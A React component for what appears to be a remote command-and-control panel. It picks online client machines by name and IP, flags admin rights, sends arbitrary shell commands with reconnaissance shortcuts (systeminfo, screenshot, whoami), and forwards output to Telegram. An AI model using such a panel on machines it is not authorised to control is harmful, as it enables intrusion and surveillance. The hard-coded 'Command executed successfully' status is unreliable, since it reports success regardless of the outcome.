import React, { useState, useRef, useEffect } from 'react';
import { Agent } from '../types';
import { FiSend, FiTrash2, FiTerminal, FiSettings, FiPaperclip } from 'react-icons/fi';

interface UnifiedTerminalProps {
  selectedAgent: Agent | null;
  agents: Agent[];
  onCommandSent: (uuid: string, command: string, taskId: string) => void;
  commandHistory: any[];
  setCommandHistory: React.Dispatch<React.SetStateAction<any[]>>;
}

const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
  selectedAgent,
  agents,
  onCommandSent,
  commandHistory,
  setCommandHistory
}) => {
  const [userInput, setUserInput] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [selectedClient, setSelectedClient] = useState<Agent | null>(selectedAgent);
  const [telegramEnabled, setTelegramEnabled] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);

  // Check if Telegram is enabled
  useEffect(() => {
    const checkTelegramStatus = () => {
      const telegramConfig = localStorage.getItem('telegram-config');
      if (telegramConfig) {
        const config = JSON.parse(telegramConfig);
        setTelegramEnabled(config.enabled && config.botToken && config.chatId);
      }
    };
    
    checkTelegramStatus();
    const interval = setInterval(checkTelegramStatus, 5000);
    return () => clearInterval(interval);
  }, []);

  // Auto-scroll to bottom when new output arrives
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [commandHistory]);

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handleSendCommand();
    }
  };

  const handleSendCommand = async () => {
    if (!userInput.trim() || !selectedClient || isProcessing) return;

    setIsProcessing(true);
    const command = userInput.trim();
    const taskId = `cmd_${Date.now()}`;

    try {
      // Add to command history
      const newEntry = {
        id: taskId,
        timestamp: new Date().toISOString(),
        command: command,
        client: selectedClient.computerName,
        status: 'executing',
        output: 'Executing command...',
        telegramSent: telegramEnabled
      };

      setCommandHistory(prev => [...prev, newEntry]);
      setUserInput('');

      // Send command
      await onCommandSent(selectedClient.uuid, command, taskId);

      // Update status after a delay
      setTimeout(() => {
        setCommandHistory(prev => 
          prev.map(entry => 
            entry.id === taskId 
              ? { ...entry, status: 'completed', output: 'Command executed successfully' }
              : entry
          )
        );
      }, 2000);

    } catch (error) {
      console.error('Error sending command:', error);
      setCommandHistory(prev => 
        prev.map(entry => 
          entry.id === taskId 
            ? { ...entry, status: 'error', output: 'Failed to execute command' }
            : entry
        )
      );
    } finally {
      setIsProcessing(false);
    }
  };

  const clearLogs = () => {
    setCommandHistory([]);
  };

  const onlineClients = agents.filter(agent => agent.status === 'online');

  return (
    <div className="premium-card h-full flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-700">
        <div className="flex items-center space-x-3">
          <FiTerminal className="w-5 h-5 text-indigo-600" />
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">AI Terminal</h2>
          {telegramEnabled && (
            <div className="flex items-center space-x-1 text-green-600">
              <FiPaperclip className="w-4 h-4" />
              <span className="text-xs font-medium">Telegram</span>
            </div>
          )}
        </div>
        
        <div className="flex items-center space-x-2">
          <button
            onClick={clearLogs}
            className="premium-button text-sm bg-gray-600 hover:bg-gray-700"
            disabled={commandHistory.length === 0}
          >
            <FiTrash2 className="w-4 h-4 mr-1" />
            Clear Logs
          </button>
        </div>
      </div>

      <div className="flex-1 flex">
        {/* Main Terminal Output Area */}
        <div className="flex-1 flex flex-col">
          {/* Client Selector */}
          <div className="p-4 border-b border-gray-200 dark:border-gray-700">
            <div className="flex items-center space-x-3">
              <label className="text-sm font-medium text-gray-700 dark:text-gray-300">
                Target Client:
              </label>
              <select
                value={selectedClient?.uuid || ''}
                onChange={(e) => {
                  const client = onlineClients.find(c => c.uuid === e.target.value);
                  setSelectedClient(client || null);
                }}
                className="premium-input max-w-xs"
                disabled={onlineClients.length === 0}
              >
                <option value="">
                  {onlineClients.length === 0 ? 'No online clients' : 'Select a client...'}
                </option>
                {onlineClients.map(client => (
                  <option key={client.uuid} value={client.uuid}>
                    {client.computerName} ({client.ipAddress})
                  </option>
                ))}
              </select>
              
              {selectedClient && (
                <div className="flex items-center space-x-2 text-sm text-gray-600 dark:text-gray-400">
                  <span className={`w-2 h-2 rounded-full ${selectedClient.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`}></span>
                  <span>{selectedClient.status}</span>
                  {selectedClient.systemInfo?.isAdmin && (
                    <span className="premium-badge badge-admin text-xs">Admin</span>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* Terminal Output */}
          <div 
            ref={terminalRef}
            className="flex-1 p-4 bg-black text-green-400 font-mono text-sm overflow-y-auto"
            style={{ minHeight: '400px' }}
          >
            {commandHistory.length === 0 ? (
              <div className="text-gray-500 text-center py-8">
                <FiTerminal className="w-8 h-8 mx-auto mb-2 opacity-50" />
                <p>No commands executed yet</p>
                <p className="text-xs mt-1">Select a client and enter a command to get started</p>
              </div>
            ) : (
              commandHistory.map((entry) => (
                <div key={entry.id} className="mb-4 border-l-2 border-green-500 pl-3">
                  <div className="flex items-center space-x-2 mb-1">
                    <span className="text-green-400 font-bold">$</span>
                    <span className="text-white">{entry.command}</span>
                    <span className="text-gray-500 text-xs">
                      [{new Date(entry.timestamp).toLocaleTimeString()}]
                    </span>
                    {entry.telegramSent && (
                      <span className="text-blue-400 text-xs">📤 Telegram</span>
                    )}
                  </div>
                  <div className="text-gray-300 whitespace-pre-wrap">
                    {entry.output}
                  </div>
                  <div className="text-xs text-gray-500 mt-1">
                    Client: {entry.client} | Status: {entry.status}
                  </div>
                </div>
              ))
            )}
          </div>

          {/* Command Input */}
          <div className="p-4 border-t border-gray-200 dark:border-gray-700">
            <div className="flex items-center space-x-3">
              <div className="flex-1">
                <textarea
                  value={userInput}
                  onChange={(e) => setUserInput(e.target.value)}
                  onKeyPress={handleKeyPress}
                  placeholder={selectedClient ? "Enter command..." : "Select a client first..."}
                  className="premium-input resize-none"
                  rows={2}
                  disabled={!selectedClient || isProcessing}
                />
              </div>
              <button
                onClick={handleSendCommand}
                disabled={!selectedClient || !userInput.trim() || isProcessing}
                className="premium-button"
              >
                <FiSend className="w-4 h-4" />
              </button>
            </div>
            
            {telegramEnabled && (
              <div className="mt-2 text-xs text-green-600 flex items-center">
                <FiPaperclip className="w-3 h-3 mr-1" />
                Command outputs will be sent to Telegram
              </div>
            )}
          </div>
        </div>

        {/* Right Sidebar */}
        <div className="w-80 border-l border-gray-200 dark:border-gray-700 p-4">
          <h3 className="text-sm font-semibold text-gray-900 dark:text-white mb-4">
            Quick Commands
          </h3>
          
          <div className="space-y-2">
            {[
              { cmd: 'systeminfo', label: 'System Info', icon: '💻' },
              { cmd: 'screenshot', label: 'Screenshot', icon: '📸' },
              { cmd: 'tasklist', label: 'Process List', icon: '📋' },
              { cmd: 'netstat -an', label: 'Network Status', icon: '🌐' },
              { cmd: 'whoami', label: 'Current User', icon: '👤' },
              { cmd: 'ipconfig', label: 'IP Config', icon: '🔧' }
            ].map((item) => (
              <button
                key={item.cmd}
                onClick={() => setUserInput(item.cmd)}
                className="w-full text-left p-2 rounded-lg bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                disabled={!selectedClient}
              >
                <div className="flex items-center space-x-2">
                  <span>{item.icon}</span>
                  <span className="text-sm font-medium text-gray-900 dark:text-white">
                    {item.label}
                  </span>
                </div>
                <div className="text-xs text-gray-500 font-mono mt-1">
                  {item.cmd}
                </div>
              </button>
            ))}
          </div>

          {/* Telegram Status */}
          <div className="mt-6 p-3 rounded-lg bg-gray-50 dark:bg-gray-800">
            <h4 className="text-sm font-semibold text-gray-900 dark:text-white mb-2">
              Telegram Integration
            </h4>
            <div className="flex items-center space-x-2">
              <div className={`w-2 h-2 rounded-full ${telegramEnabled ? 'bg-green-500' : 'bg-red-500'}`}></div>
              <span className="text-xs text-gray-600 dark:text-gray-400">
                {telegramEnabled ? 'Connected' : 'Disabled'}
              </span>
            </div>
            {telegramEnabled && (
              <p className="text-xs text-gray-500 mt-1">
                All command outputs will be sent to your Telegram chat
              </p>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default UnifiedTerminal;